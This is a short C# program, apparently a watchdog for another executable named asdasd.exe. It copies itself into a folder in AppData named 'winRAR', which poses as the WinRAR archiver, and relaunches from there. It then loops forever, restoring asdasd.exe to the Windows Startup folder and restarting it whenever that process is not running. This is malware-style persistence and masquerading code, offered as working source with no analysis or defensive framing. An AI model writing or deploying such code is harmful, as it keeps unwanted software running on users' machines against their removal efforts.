using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Reflection;

namespace listenerWatcher
{
    internal class Program
    {
        static void Main(string[] args)
        {
            
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\asdasd.exe"))
            {
                Environment.Exit(0);
            }


            if (Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) != Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\winRAR")
            {
                if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\winRAR"))
                {
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winRAR");
                }
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winRAR\\lW.exe"))
                {
                    File.Copy(Assembly.GetExecutingAssembly().Location, (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winRAR\\lW.exe"));

                }
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winRAR\\lW.exe");
                Environment.Exit(0);
            }

            try
            {
                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\asdasd.exe"))
                {
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\asdasd.exe", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winRAR\\asdasd.exe", true);
                }
                else
                {
                    Environment.Exit(0);
                }
            }
            catch (Exception)
            {

                throw;
            }
            


            _ = figyel();
            Console.ReadKey();

        }

        static async Task figyel()
        {

            while (true) 
            {
                if (Process.GetProcessesByName("asdasd").Length == 1)
                {
                    Console.WriteLine("van");
                }/*else if(Process.GetProcesses("asdasd").Length > 1){
                    foreach (var process in Process.GetProcessesByName("asdasd"))
                    {
                        process.Kill();
                    }
                }*/
                else
                {
                    Console.WriteLine("nincs");
                    if (!File.Exists((Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\asdasd.exe")))
                    {
                        File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winRAR\\asdasd.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\asdasd.exe");
                    }
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\asdasd.exe");

                }
            }

            



        }


    }
}
